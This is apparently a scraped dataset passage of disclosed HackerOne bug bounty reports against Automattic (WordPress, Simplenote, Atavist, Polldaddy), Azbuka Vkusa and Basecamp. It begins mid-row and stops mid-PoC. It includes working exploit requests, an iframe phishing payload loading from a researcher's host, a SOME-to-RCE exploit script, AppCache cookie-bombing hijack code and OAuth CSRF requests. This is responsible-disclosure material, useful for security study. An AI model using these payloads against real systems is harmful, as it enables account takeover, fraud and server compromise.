I only displayed the contents of the /etc/passwd file in the PoC video. However, since I can execute arbitrary PHP code, a complete compromise of the WordPress installation is possible. If an attacker can gain access to a Shop manager account, he can easily and without restrictions take over the server.1 attachment:F340061: poc.jpg",https://hackerone.com/reports/403083,California,United States,San Francisco,2018,8,30,16,37
Automattic,1001-5000,0.0,50m-100m,$100.00,High,7.95,Improper Access Control - Generic,Can buy Atavist Magazine subscription for free,"bugra  submitted a report to Automattic.Aug 4th (2 years ago)Summary:
Hi team
If you go to https://magazine.atavist.com/ and scroll down. You will see membership price is $25, but I found a way to buy this subscription for free via Gift feature.
When you send gift request before adding any credit card to your account you will see this response :
Image F936531: request.PNG 72.04 KiBZoom in Zoom out Copy Download
However, if you check the gift recipient's email you will see the Gift email that contains the gift link.
Image F936533: mail.PNG 40.13 KiBZoom in Zoom out Copy Download
Steps To Reproduce:

Just send this request (change YOUR_EMAIL, YOUR_PASSWORD, RECIPIENT_EMAIL, gift_timestamp to current date, it was 2020-8-4 while reporting this)  :

Code 670 BytesWrap lines Copy Download1POST /api/v2/store/purchase.php HTTP/1.1
2Host: magazine.atavist.com
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
4Accept: application/json, text/javascript, */*; q=0.01
5Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
6Accept-Encoding: gzip, deflate
7Content-Type: application/x-www-form-urlencoded; charset=UTF-8
8Content-Length: 204
9Origin: https://magazine.atavist.com
10DNT: 1
11Connection: close
12Referer: https://magazine.atavist.com/
13
14email=YOUR_EMAIL&password=YOUR_PASSWORD&product_id=com.theatavist.atavist.subscription.membership&gift_timestamp=2020-8-4&gift_recipient=RECIPIENT_EMAIL&gift_message=test&gift_gifter=test
You will see {""error"":""invalid_request_error"",""error_description"":""The customer must have an active payment source attached.""} in response but if you check the recipient's email, you will see the gift link.
Impact
Able to buy magazine membership for free
Thanks,
Bugra2 attachments:F936531: request.PNGF936533: mail.PNGxknown Automattic staff  posted a comment. Aug 5th (2 years ago)Thank you for your submission. Your report will be reviewed and we'll get back to you shortly.xknown Automattic staff  posted a comment. Sep 16th (2 years ago)Hi @bugra, we deployed a patch to address this issue. Can you please test it when you get a chance?
    
    
        
            
                
                
                
            
        
    
bugra   posted a comment. Updated Sep 16th (2 years ago)Hi @xknown, I confirmed the fix. And I couldn't find any bypass, you can close this report as Resolved.xknown Automattic staff  closed the report and changed the status to Resolved. Sep 16th (2 years ago)Automattic  rewarded bugra with a $100 bounty. Sep 16th (2 years ago)Hi @bugra. We would like thank you again for your submission and helping make Atavist a safer place. We look forward to more reports from you in the future.
    
    
        
            
                
                
                
            
        
    
bugra   requested to disclose this report. Nov 18th (2 years ago)Hi @xknown, can we disclose all of my reports for the community?xknown Automattic staff  agreed to disclose this report. Nov 18th (2 years ago)  This report has been disclosed. Nov 18th (2 years ago)",https://hackerone.com/reports/951230,California,United States,San Francisco,2020,8,4,20,24
Automattic,1001-5000,0.0,50m-100m,$100.00,Medium,5.45,Improper Access Control - Generic,"Captcha checker ""pd-captcha_form_SURVEYID"" cookie is accepting any value","bugra  submitted a report to Automattic.Jul 9th (2 years ago)Summary:
Hi team,
There is a Captcha protection feature on surveys and polls. If you captcha protection enabled survey, you will see this :
Image F901789: captcha.PNG 11.02 KiBZoom in Zoom out Copy Download
When you solve captcha and click Submit Captcha, website sets a cookie like this :
Image F901799: cookie.PNG 31.66 KiBZoom in Zoom out Copy Download
And if you delete this cookie and try access to survey, you will see captcha again. But if you change value of this cookie, you can access still.
So any attacker can bypass this restriction via typing random value to cookie.
Steps To Reproduce:

Go to a captcha protected survey or poll
Solve the captcha and click Submit Captcha
Now change the value of pd-captcha_form_SURVEYID cookie to random value from browser's console.
Refresh the page and you will see you can access to survey and submit the survey.

Impact
Bypassing captcha protection on surveys and polls
Thanks,
Bugra2 attachments:F901789: captcha.PNGF901799: cookie.PNG",https://hackerone.com/reports/920357,California,United States,San Francisco,2020,7,9,22,18
Automattic,1001-5000,0.0,50m-100m,$250.00,Medium,5.45,Violation of Secure Design Principles,cloudup Subdomain Takeover That resolves to Desk.com ( CNAME cloudup.desk.com ) ,"khizer47  submitted a report to Automattic.Jan 28th (6 years ago)Hi,
While Looking On The CloudUp Website I found That One of The Subdomain of CloudUp help.cloudup.com was Hosted on Desk.com and I think tHe Desk Account of Cloudup was Expired or Canceled by any cause So I have Checked The Site for its CNAME and The CNAME was Resolving to
###CNAME	http://cloudup.desk.com
So I Tried to Make an Account on desk.com With the same as The CNAME Cloud.desk.com And I was Successful in this Coz Of The Account of cloudup was Expired or cancelled, Now I have setup my page on the site.
But Due to some Problem The Main Domain ***help.cloudup.com (See Screenshot Below 0.png) is Showing SSL Error Maybe due to expired Certificate I'm Not sure as I'm just a Started still have to learn many things!
So Due to the Error I'm unable to Show my Message on The Main Domain But Still I have Full Control over The CNAME ( See Screenshots) 
Hope This Will Be Resolved
Thanks,
Muhammad Khizer Javed5 attachments:F155716: 1.PNGF155717: 0.PNGF155718: 3.PNGF155719: 4.PNGF155720: 2.PNGxknown Automattic staff  changed the status to Triaged. Jan 30th (6 years ago)Hi. Thanks for the report. We are going to take a look.xknown Automattic staff  closed the report and changed the status to Resolved. Jan 31st (6 years ago)Hi. We removed the help.cloudup.com cname record.
Code 37 BytesWrap lines Copy Download1$ dig cname help.cloudup.com +short
2$Automattic  rewarded khizer47 with a $250 bounty. Jan 31st (6 years ago)
    
    
        
            
                
                
                
            
        
    
khizer47   requested to disclose this report. Jan 31st (6 years ago)Thanks for The Bounty <3 As Its Resolved can we Disclose it? If you like :) xknown Automattic staff  agreed to disclose this report. Feb 2nd (6 years ago)  This report has been disclosed. Feb 2nd (6 years ago)
    
    
        
            
                
                
                
            
        
    
khizer47   posted a comment. Dec 2nd (5 years ago)Hi, @automattic I found a Similar Subdomain Takeover in one of your website and I'm not sure what if the web can be in scope or not .. Should i report that or can u share any email where i can confirm the website? the Whois info shows that the web belongs to you guys. 
Thanks",https://hackerone.com/reports/201796,California,United States,San Francisco,2017,1,28,18,13
Automattic,1001-5000,0.0,50m-100m,$75.00,No value,0.0,Open Redirect,CPU utilization 99% on visiting wordpress site url & open redirect found,"csanuragjain  submitted a report to Automattic.Apr 7th (7 years ago)Working POC for making CPU 99% for wordpress user

Login to wordpress account
Visit any of the below url's which are sent by attacker to victim (since these are wordpress url so victim will accept & open)
1.https://wordpress.com/post/20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
2.https://wordpress.com/design/1000000000000000000000
3.https://wordpress.com/pages/anurag.wordpress.com/-10000000000000000000000000000000000000000000000
Check your CPU usage in task manager. It would go to 99% as shown in attached.
This happens since these pages continues to send unlimited requests to https://pixel.wp.com/g.gif?v=wpcom-no-pv&x_newdash_pageviews=route&t=0.1642450245826501
Unlimited request are send since I think the variable holding the Post id cannot hold a value as long as 20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 which throws an exception.
Problem: User CPU goes 99% causing the browser to go very very slow & unresponsive. Negative impact on customer.

Working POC for open redirect

Access wordpress using url https://wordpress.com/wp-login.php?redirect_to=https%3A%2F%2Fgoogle.com%2Fsearch?q=myFakeSite&reauth=1
After login you will be redirected to https://www.google.co.in/search?q=myFakeSite&gws_rd=cr&ei=WLYGV8fUHIq8uATj56uIBA which is incorrect. Wordpress should not allow redirecting to external websites like google,yahoo.
Problem: In future if there is any bug in these external site then this open redirect from wordpress could cause harm to users.
1 attachment:F83893: wordpress.png",https://hackerone.com/reports/129091,California,United States,San Francisco,2016,4,7,19,41
Automattic,1001-5000,0.0,50m-100m,$100.00,No value,0.0,UI Redressing (Clickjacking),Crafted frame injection leading to form-based UI redressing.,"edoverflow  submitted a report to Automattic.Nov 19th (5 years ago)Summary
One can inject iframes into a note and create a login form that sends the user's details to a third-party server. Once again I will let the PoC do most of the explaining.
PoC
Paste the following snippet into a Simplenote and then view it in the preview panel. I am using the latest stable build of the Simplenote app (v1.0.8) on Ubuntu 17.10.
Code 2.00 KiBWrap lines Copy Download1Lorem Ipsum 
2
3Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor 
4incididunt ut labore et dolore magna aliqua. Mattis vulputate enim nulla 
5aliquet porttitor lacus luctus accumsan tortor. Lorem dolor sed viverra ipsum 
6nunc aliquet bibendum enim. Nibh cras pulvinar mattis nunc sed blandit. Nunc 
7scelerisque viverra mauris in aliquam sem. Diam sit amet nisl suscipit. Felis 
8imperdiet proin fermentum leo vel. Ut sem viverra aliquet eget sit amet tellus 
9cras adipiscing. Enim eu turpis egestas pretium aenean pharetra magna ac. 
10Faucibus nisl tincidunt eget nullam non nisi est sit amet. In eu mi bibendum 
11neque egestas. Ipsum consequat nisl vel pretium lectus quam. At auctor urna 
12nunc id cursus metus aliquam eleifend. Accumsan lacus vel facilisis volutpat 
13est velit egestas dui. Proin nibh nisl condimentum id venenatis a. In aliquam 
14sem fringilla ut morbi tincidunt augue interdum velit. Maecenas accumsan lacus 
15vel facilisis volutpat est. Pharetra pharetra massa massa ultricies. Cras 
16pulvinar mattis nunc sed blandit libero volutpat. Et netus et malesuada fames 
17ac turpis egestas sed. 
18
19Accumsan lacus vel facilisis volutpat est. Ipsum dolor sit amet consectetur 
20adipiscing elit ut aliquam. Gravida neque convallis a cras semper auctor neque 
21vitae tempus. Dui accumsan sit amet nulla facilisi. Etiam dignissim diam quis 
22enim. Posuere sollicitudin aliquam ultrices sagittis orci a scelerisque <iframe 
23src=""https://edoverflow.com/poc/simplenote-login.html"" style=""margin:0;"" 
24frameborder=0> purus. Proin nibh nisl condimentum id venenatis a condimentum 
25vitae sapien. Netus et malesuada fames ac turpis egestas sed tempus urna. Urna 
26nec tincidunt praesent semper feugiat nibh. Semper risus in hendrerit gravida 
27rutrum quisque non tellus orci. Dictumst quisque sagittis purus sit. Quam id 
28leo in vitae turpis. Fringilla est ullamcorper eget nulla facilisi etiam 
29dignissim diam quis. Tellus at urna condimentum mattis pellentesque id nibh 
30tortor id. Molestie ac feugiat sed lectus vestibulum mattis.
Image F240841: Sign_in_to_Simplenote_001.png 57.80 KiBZoom in Zoom out Copy Download
A more convincing PoC would probably consist of playing around CSS to make the app look like it has crashed and then prompt the user to login in again.
Mitigation
Since Simplenote is built on Electron I would imagine it should be easy to implement a Content Security Policy and you should be able to set the frame-src directive to none. This can be achieved by adding the following meta element in the index.html file: 
Code 71 BytesWrap lines Copy Download1<meta http-equiv=""Content-Security-Policy"" content=""frame-src 'none';"">
On top of that, I would suggest looking into implementing a fully-fledged CSP to prevent similar attacks and to reduce the impact of XSS.1 attachment:F240841: Sign_in_to_Simplenote_001.pngxknown Automattic staff  posted a comment. Nov 20th (5 years ago)Hi. Thanks for the report. We will take a look at this issue.roundhill Automattic staff  posted a comment. Nov 20th (5 years ago)Hi there,
This is a known issue, I believe. It should be fixed in our 1.1.0 release that is going out tomorrow. You can get builds here: https://github.com/Automattic/simplenote-electron/releases/tag/1.1.0-rc3
Related: https://github.com/Automattic/simplenote-electron/issues/487
    
    
        
            
                
                
                
            
        
    
edoverflow   posted a comment. Nov 27th (5 years ago)Hi @roundhill,
I was checking on the status of this report and I was wondering if you could give me an update. Is there anything that I can do to help?
Best regards,
Edxknown Automattic staff  posted a comment. Nov 27th (5 years ago)Hi. The 1.1.0 version was released a week ago (https://simplenote.com/2017/11/20/windows-and-linux-app-update-now-available-2/). I believe this fixes the reported problem.
    
    
        
            
                
                
                
            
        
    
edoverflow   posted a comment. Nov 27th (5 years ago)Hi @xknown,
I can confirm that the new release fixes this issue.xknown Automattic staff  closed the report and changed the status to Resolved. Nov 29th (5 years ago)Automattic  rewarded edoverflow with a $100 bounty. Updated Nov 29th (5 years ago)Hi. Thanks again for the report. Marking this as resolved.
    
    
        
            
                
                
                
            
        
    
edoverflow   requested to disclose this report. Dec 1st (5 years ago)Thank you very much! I would, hereby, kindly request we publicly disclose this report in order to inform fellow researchers and programs on HackerOne.  This report has been disclosed. Dec 31st (5 years ago)",https://hackerone.com/reports/291683,California,United States,San Francisco,2017,11,19,10,13
Automattic,1001-5000,0.0,50m-100m,$75.00,No value,0.0,None,CSV Injection in polldaddy.com,"strukt  submitted a report to Automattic.Oct 4th (7 years ago)Hello,
We can inject commands in any fields of a member in an email group (=2*10 for example), and when it's exported to CSV it will be evaluated to 20 in the corresponding cell, this enables an attacker to spread malware and execute system level commands on a victim's machine if the victim downloaded the CSV file.
Steps to reproduce:
1-  Create an email group and name it anything.
2- Add a member with =210 in their firstname, lastname, and custom data.
3- Export as CSV and open in Excel or any similar program, the evaluated value will replace the =210 expression.
References: Report #90415 was about the same issue.
Thanks,
strukt2 attachments:F56160: capture1.PNGF56161: capture2.PNG",https://hackerone.com/reports/92353,California,United States,San Francisco,2015,10,4,23,17
Automattic,1001-5000,0.0,50m-100m,"$1,337.00",No value,0.0,Code Injection,WordPress SOME bug in plupload.flash.swf leading to RCE,"cure53  submitted a report to Automattic.Apr 26th (7 years ago)Intro
WordPress is vulnerable against a Same-Origin Method Execution (SOME) vulnerability that stems from an insecure URL sanitization problem performed in the file plupload.flash.swf. The code in the file attempts to remove flashVars ¹ in case they have been set GET parameters but fails to do so, enabling XSS via ExternalInterface ².
The attack technique was first described by Soroush Dalili in 2013 ³. The vulnerability in plupload.flash.swf was discovered in April 2016, first identified as SOME⁴ bug by Kinugawa. Then, after a team review, the XSS potential was discovered and analyzed by Heiderich, Kinugawa and Inführ. Finally, it was discovered, that this file comes packaged with latest WordPress and the issue was reported here by Heiderich et al.
Simple PoC:
http://example.com//wp-includes/js/plupload/plupload.flash.swf?%#target%g=alert&uid%g=hello&
A more complex PoC was created to demonstrate the potential Remote Code Execution attack (RCE) of this vulnerability. A detailed description thereof can be found below.
Code 493 BytesWrap lines Copy Download1<button onclick=""fire()"">Click</button>
2<script>
3function fire() {
4 open('javascript:setTimeout(""location=\'http://example.com/wp-includes/js/plupload/plupload.flash.swf?%#target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\'"", 2000)');
5  setTimeout('location=""http://example.com/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550""')
6}
7</script>
Background
The majority of background information as to why this kind of attack works and how the protective mechanisms installed in the SWF can be bypassed was already explained in depth in this bug report:
https://hackerone.com/bugs?subject=user&report_id=134546
This section will therefore describe the SOME bug in more detail and omit the basics on why the attack works as they are identical to the ones in the other ticket. Now, let's get specific with this bug's details.
Similar to the affected file in the linked report, Plupload employs the so called “GET Killer”:
Code 316 BytesWrap lines Copy Download1params = root.loaderInfo.parameters;
2pos = root.loaderInfo.url.indexOf('?');
3if (pos !== -1) {
4    query = Utils.parseStr(root.loaderInfo.url.substr(pos + 1));        
5    
6    for (var key:String in params) {    
7        if (query.hasOwnProperty(Utils.trim(key))) {
8            delete params[key];
9        }
10    }
11}
From: https://github.com/moxiecode/moxie/blob/d91c63758c1d372a38615e8b966b50545faa70ca/src/flash/src/Moxie.as#L70
The string parsing is done in a different ActionScript file:
Code 497 BytesWrap lines Copy Download1static public function parseStr (str:String) : Object {
2    var hash:Object = {},
3        arr1:Array, arr2:Array;
4    
5    str = unescape(str).replace(/\+/g, "" "");
6    
7    arr1 = str.split('&');
8    if (!arr1.length) {
9        return {};
10    }
11    
12    for (var i:uint = 0, length:uint = arr1.length; i < length; i++) {
13        arr2 = arr1[i].split('=');
14        if (!arr2.length) {
15            continue;
16        }
17        hash[Utils.trim(arr2[0])] = Utils.trim(arr2[1]);
18    }
19    return hash;
20}
From: https://github.com/moxiecode/moxie/blob/d91c63758c1d372a38615e8b966b50545faa70ca/src/flash/src/mxi/Utils.as#L102
The sanitization in this file is done quite well and strict enough to prohibit XSS attacks. An attacker can however select a different type of attack, also known as SOME or Reverse Clickjacking.
The affected code can be found here:
Code 289 BytesWrap lines Copy Download1private function _fireEvent(evt:*, obj:* = null):void {
2    try {
3        ExternalInterface.call(eventDispatcher, evt, obj);
4    } catch(err:*) {
5        //_fireEvent(""Exception"", { name: 'RuntimeError', message: 4 });
6        
7        // throwing an exception would be better here
8    }
9}
The method is being called from within the _init() method and receives an event and an optional object. The actual event dispatcher is stored as an object member at a different place in the code.
Calling _fireEvent:
Code 92 BytesWrap lines Copy Download1Moxie.uid = Utils.sanitize(params[""uid""]);    
2
3[...]
4
5_fireEvent(Moxie.uid + ""::Init"");    
Setting the event dispatcher:
Code 138 BytesWrap lines Copy Download1// Event dispatcher
2if (params.hasOwnProperty(""target"") && /^[\w\.]+$/.test(params[""target""])) {
3    eventDispatcher = params[""target""];
4}
The sanitation for both the event dispatcher and the event string is quite tough and only allows word characters in one case, and word characters and the dot in the other case:
Code 77 BytesWrap lines Copy Download1if (params.hasOwnProperty(""target"") && /^[\w\.]+$/.test(params[""target""])) {
2
Code 175 BytesWrap lines Copy Download1static public function sanitize(str:String) : String
2{
3    // allow only [a-zA-Z0-9_]
4    return str.replace(/[^\w]/g, '');
5}
6[...]
7Moxie.uid = Utils.sanitize(params[""uid""]);
8
Despite the strong validation, the attacker can still cause damage - tremendous damage too. This is done by executing a SOME attack. This kind of attack allows to generate certain types of events by abusing the callback.
An attacker can for example click a button on the same domain as the Flash file by instructing the Flash file, not to execute a pre-defined callback but rather by making use of certain DOM properties that give more or less direct access to the button and then by executing a click() method. Let’s have a look at a trivial example first and imagine victim.com that hosts both the Plupload SWF and some logic, where a click on a button will, let’s say, delete a user:

Attacker crafts a specific payload
Attacker then lures logged in victim to a website 
The website will do the following steps 
Open the Plupload SWF in a new tab
Have the SWF use the target parameter opener.document.body.firstElementChild.firstElementChild.click
While the SWF still loads, the opener location changes
It navigates to victim.com/admin
Now, SWF and page are on the same domain
SWF is now allows to perform clicks on opener. The button will be clicked

Done, that is the whole attack in simple. Open SWF in a new window, define a callback that traverses to an important element and clicks it, navigate the opener to the page containing the element, have the click happen.
Now, the following more specific PoC describes the attack against WordPress and shows, how we can turn the SOME into an RCE!

An attacker sends a link that contains the exploit to an authenticated user
The user (victim) opens the link and clicks the button
The exploit opens a new window to the SWF file, meanwhile the other window is loading the plugin page
The exploit then triggers the install button of a malicious plugin
The plugin is installed and the malicious codes are uploaded on the server accordingly

Code 493 BytesWrap lines Copy Download1<button onclick=""fire()"">Click</button>
2<script>
3function fire() {
4 open('javascript:setTimeout(""location=\'http://example.com/wp-includes/js/plupload/plupload.flash.swf?%#target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\'"", 2000)');
5  setTimeout('location=""http://example.com/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550""')
6}
7</script>
Affected Systems
All WordPress instances that allow to directly call this file. That should be the absolute majority. Google finds a couple of them but we assume it is actually significantly more⁹.
Here is some numbers that other people guesstimate:

https://managewp.com/14-surprising-statistics-about-wordpress-usage
https://www.quora.com/How-many-websites-are-built-on-Wordpress
https://wordpress.com/activity/

Further note, browser-based XSS filters will not detect the attack and hence not protect here.
Mitigation

Prevent direct access to all Flash files in the WordPress folder (Content-Disposition headers might help)
Configure your WAF to block direct access to this file
Wait for the fix and update Wordpress

Credits
Credits for this find go to Soroush Dalili for initially documenting the attack technique that helped bypassing “The GET Killer”.
Further credits go to Kinugawa, Filedescriptor and Heiderich of Cure53 for discovering the bug in WordPress default installations and developing an attack scenario leading to RCE by using SOME to install rogue WordPress Plugins.",https://hackerone.com/reports/134738,California,United States,San Francisco,2016,4,26,9,53
Automattic,1001-5000,0.0,50m-100m,$300.00,High,7.95,Violation of Secure Design Principles,Email Verification bypass on signup,"haqsek2  submitted a report to Automattic.Nov 21st (2 years ago)Summary:
This bug is related to wordpress.com. There is feature in wordpress.com which allow users to invite people. We have to enter email address to invite that particular person but the invite link and invite key is also available to the person who invited. This allow attackers to create the profile without having access to the email address and they can make account on behalf of any people who  is not already signed up in wordpress.com
Platform(s) Affected:
wordpress.com
public-api.wordpress.com
Steps To Reproduce:
This issue can be reproduced by following these easy steps: 

Login to your account on wordpress.com
Setup burpsuite proxy with browser.
Select your site and navigate to manage>people
Enter any email address which is not already registered in wordpress.com and invite
Open this url in browser: https://wordpress.com/people/invites/yoursite.wordpress.com   [change yoursite.wordpress.com with your site]
See the burp suite proxy tab and find the GET request to this endpoint [https://public-api.wordpress.com/rest/v1.1/sites/siteId_here/invites?http_envelope=1&status=all&number=100][there will be a number instead of siteId_here]
In response of this GET request you will see JSON which will be consisting of the details about the invitations sent and there you will find ""invite_key"" and ""link"".
Copy the link and open this in another browser.
You can create account on behalf of this email without having access to the email and email verification is bypassed :)

See the attached video for POC
Mitigation:
This is the pure violation of secure design principles, this can be mitigated by just removing the [invite_key] and [link] from the response in [https://public-api.wordpress.com/rest/v1.1/sites/siteId_here/invites?http_envelope=1&status=all&number=100]. Because this invite key and link is the property of the person being invited, showing these creds to other people will result this type of issue.
Impact
This issue can be used to bypass email verification on signup. Attackers can create account on behalf on any person without having access to the email account. This issue is affecting integrity of the wordpress.com1 attachment:F1088626: wordpresscom-2020-11-21_01.21.40.mp4",https://hackerone.com/reports/1040047,California,United States,San Francisco,2020,11,21,9,29
Azbuka Vkusa,10001,0.0,200m-1b,$300.00,High,8.3,Information Disclosure,Corporate Jira credentials disclosed in public gist,mkhazov  submitted a report to Azbuka Vkusa.Aug 14th (2 years ago)dkuzevanov   updated the severity from critical (9.9) to high (8.3). Aug 14th (2 years ago)dkuzevanov   changed the status to Triaged. Aug 14th (2 years ago)Azbuka Vkusa  rewarded mkhazov with a $300 bounty. Aug 14th (2 years ago)dkuzevanov   closed the report and changed the status to Resolved. Aug 14th (2 years ago)mkhazov   posted a comment. Aug 14th (2 years ago)dkuzevanov   posted a comment. Aug 14th (2 years ago)dkuzevanov   requested to disclose this report. Nov 15th (about 1 year ago)mkhazov   agreed to disclose this report. Nov 15th (about 1 year ago)  This report has been disclosed. Nov 15th (about 1 year ago),https://hackerone.com/reports/958432,Moscow,Russia,Moscow,2020,8,14,6,6
Azbuka Vkusa,10001,0.0,200m-1b,"$1,000.00",Critical,9.1,Information Disclosure,Endpoint without access control leads to order informations and status changes,cabelo  submitted a report to Azbuka Vkusa.Dec 4th (2 years ago),https://hackerone.com/reports/1050753,Moscow,Russia,Moscow,2020,12,4,17,57
Azbuka Vkusa,10001,0.0,200m-1b,$300.00,High,7.5,Insecure Direct Object Reference (IDOR),IDOR - Other user's delivery address disclosed,sachin_kumar_  submitted a report to Azbuka Vkusa.Aug 21st (2 years ago),https://hackerone.com/reports/964010,Moscow,Russia,Moscow,2020,8,21,9,30
Azbuka Vkusa,10001,0.0,200m-1b,$300.00,High,7.2,Cleartext Transmission of Sensitive Information,Leak of Google Sheets API credentials,adsec2s  submitted a report to Azbuka Vkusa.Aug 23rd (2 years ago),https://hackerone.com/reports/965314,Moscow,Russia,Moscow,2020,8,23,15,53
Azbuka Vkusa,10001,0.0,200m-1b,$100.00,Medium,4.7,Cross-site Scripting (XSS) - Reflected,Reflected XSS in photogallery component on [https://market.av.ru],haxta4ok00  submitted a report to Azbuka Vkusa.Sep 22nd (2 years ago),https://hackerone.com/reports/988271,Moscow,Russia,Moscow,2020,9,22,15,30
Azbuka Vkusa,10001,0.0,200m-1b,"$2,000.00",Critical,9.4,Misconfiguration,Мисконфигурация Cisco Smart Install,kerbyj  submitted a report to Azbuka Vkusa.Nov 12th (about 1 year ago),https://hackerone.com/reports/1398662,Moscow,Russia,Moscow,2021,11,12,10,1
Azbuka Vkusa,10001,0.0,200m-1b,$150.00,Medium,4.7,Cross-site Scripting (XSS) - Reflected,Reflected XSS on av.ru via `q` parameter at https://av.ru/collections/*,ronr  submitted a report to Azbuka Vkusa.Aug 24th (2 years ago),https://hackerone.com/reports/965663,Moscow,Russia,Moscow,2020,8,24,9,17
Basecamp,11-50,0.0,10m-50m,"$1,000.00",High,7.95,Denial of Service,a very long name in hey.com can prevent anyone from accessing their contacts and probably can cause denial of service,"tw4v3sx  submitted a report to Basecamp.Oct 24th (2 years ago)Summary :
after trying to change my initial name to something long i found out that their are no limits to how long it can be , so i directly changed it to something very long name.txt (F1050497) which caused my account to really slow down when accessing it and in the android app , it just keeps crashing whenever i open it ( no way to access my account at all ) + if i make it longer i get a 500 Internal Server Error response which highly suggests that this can cause a server side denial of service .
Description:
due to not checking the length of the name one can change it to a very long one causing both a server side denial of service  and a client side one
server side :
one can send multiple requests to change the name of the account and each of them containing a very long name which will cause a 500 internal server error leading to an extensive Resource Consumption.
client side :

if one is able to change the name another account he will also have the ability to crash his android app therefore preventing him from accessing his account.
if one with a long name sends a message to any email he will slowwwwww down everything where the message appears including folders (inbox , trash ..) and prevent him from accessing his contacts where the email's name also appears , because the app will hang on a loading screen for about 40min each time , and this can be more if for example he sends multiple messages or use multiple accounts ( each on with a long name ) to send a message to the victim mail.

Proof of Concept:

open https://app.hey.com/contacts/%user_id_number%/user/editand change the name to the one attached name.txt (F1050497) and submit.
now u can't open the android app and u can slow down anyone's account just by sending them a message (or multiple ones).

Impact

Attacker can perform a DoS Attack against the server
slow down anyone's account
crash the android app
1 attachment:F1050497: name.txt",https://hackerone.com/reports/1018037,Illinois,United States,Chicago,2020,10,24,22,32
Basecamp,11-50,0.0,10m-50m,"$1,000.00",High,7.95,Business Logic Errors,Attachments may be hijacked via AppCache+CookieBombing trick (bc3_production_blobs bucket),"hudmi  submitted a report to Basecamp.Aug 31st (4 years ago)Basecamp attachments are stored in the bc3_production_blobs bucket in the root directory and can be served with text/html content-type. 
https://storage.googleapis.com/bc3_production_blobs/*key*?GoogleAccessId=bc3-production-storage%40bc3-production.iam.gserviceaccount.com&Expires=1535826443&Signature=*sign*&response-content-type=text/html
So with AppCache+CookieBombing trick an attacker can upload html file and if the user visit url of this file then all further uploads to this bucket and downloads from it will be hijacked by an attacker.
To know more about this trick refer to https://labs.detectify.com/2018/08/02/bypassing-exploiting-bucket-upload-policies-signed-urls/
Reproduction steps
To upload the files:

Login to 3.basecamp.com
Open campfire of any project
Upload target files 
Extract direct links of them to Google Storage and remove response-content-disposition param

I have uploaded 3 files by this way:
Code 280 BytesWrap lines Copy Download1<html manifest=""[manifest_url]"">
2This is the test page for a PoC. Now if you send any request in this bucket it will be hijacked.
3<script>
4setTimeout(function(){
5for(var i = 1e3; i>0; i--){document.cookie = i + '=' + Array(4e3).join('0') + '; path=/'};
6}, 3000);
7</script>
8</html>
Code 64 BytesWrap lines Copy Download1CACHE MANIFEST 
2
3FALLBACK:
4/bc3_production_blobs/ [fallback_url]
Code 99 BytesWrap lines Copy Download1<html>
2<script>
3alert('Your request to the page '+location.href+' is hijacked!');
4</script>
5</html>
PoC
Go to http://████████/bc3attach and then try to open any direct link of bc3_production_blobs bucket. You will see alert popup with full url of this file.
Refer to the video.
Impact
Direct links to any attachments can be hijacked and confedential files can be compromised1 attachment:F340718: capture-132.avi",https://hackerone.com/reports/403602,Illinois,United States,Chicago,2018,8,31,18,58
Basecamp,11-50,0.0,10m-50m,"$2,000.00",High,8.1,Cross-Site Request Forgery (CSRF),CSRF on launchpad.37signals.com OAuth2 authorization endpoint,"carbon61  submitted a report to Basecamp.Apr 14th (3 years ago)Hi,
I found a CSRF in the OAuth2 authorization endpoint on launchpad.37signals.com. That allows a malicious 3rd party application to gain full API access to  victim's  account in 37signals products  that uses OAuth2 authorization.
I found that when making a post request to authorization  endpoint it does not check the ""authenticity token"" if you add "" .json or .xml "" like this ""authorization.json"" .
post request:
Code 742 BytesWrap lines Copy Download1POST /authorization.json HTTP/1.1
2Host: launchpad.37signals.com
3Connection: close
4Content-Length: 168
5Cache-Control: max-age=0
6Origin: null
7Upgrade-Insecure-Requests: 1
8Content-Type: application/x-www-form-urlencoded
9User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
10Sec-Fetch-Dest: document
11Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
12Sec-Fetch-Site: same-origin
13Sec-Fetch-Mode: navigate
14Sec-Fetch-User: ?1
15Accept-Encoding: gzip, deflate
16Accept-Language: en-US,en;q=0.9
17Cookie: _beanstalk_uuid=
18
19client_id={your-client-id}&type=web_server&redirect_uri={your-redirect-uri}&commit=
20
After a 3rd party application gets the authorization code from redirect_uri, it can then exchange it for an access token. and get full access to the api.
request to get the access token:
Code 732 BytesWrap lines Copy Download1POST /authorization/token HTTP/1.1
2Host: launchpad.37signals.com
3Connection: close
4Upgrade-Insecure-Requests: 1
5User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
6Sec-Fetch-Dest: document
7Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
8Sec-Fetch-Site: none
9Sec-Fetch-Mode: navigate
10Accept-Encoding: gzip, deflate
11Accept-Language: en-US,en;q=0.9
12Cookie: _beanstalk_uuid=
13Content-Type: application/x-www-form-urlencoded
14Content-Length: 214
15
16type=web_server&client_id={your-client-id}&redirect_uri={your-redirect-uri}&client_secret={your-client-secret}&code={authorization-code}
17
PoC:
1- you will need to register on the 37Signals Integration Portal.
2- Login to any 37Signals apps that uses the OAuth2 authorization for example basecamp 3 account. (i tested it using basecamp 3 )
3- for testing , submit the following form through the browser in which you are logged in:
Code 485 BytesWrap lines Copy Download1<form action=""https://launchpad.37signals.com/authorization.json"" method=""POST"">
